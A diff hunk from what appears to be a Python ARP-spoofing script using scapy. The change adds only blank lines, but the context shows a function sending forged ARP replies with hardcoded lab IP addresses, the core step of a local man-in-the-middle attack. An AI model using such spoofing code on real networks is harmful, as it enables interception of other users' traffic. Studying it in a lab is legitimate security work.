@@ -18,6 +18,8 @@ def spoof(target_ip, spoof_ip):
  packet = scapy.ARP(op=2, pdst="192.168.13.131", psrc="192.168.13.2")
  scapy.send(packet, verbose=False)
 
+ 
+ 
 def restore(dest_ip, source_ip):
  dest_mac = get_mac(dest_ip)
  source_mac = get_mac(source_ip)
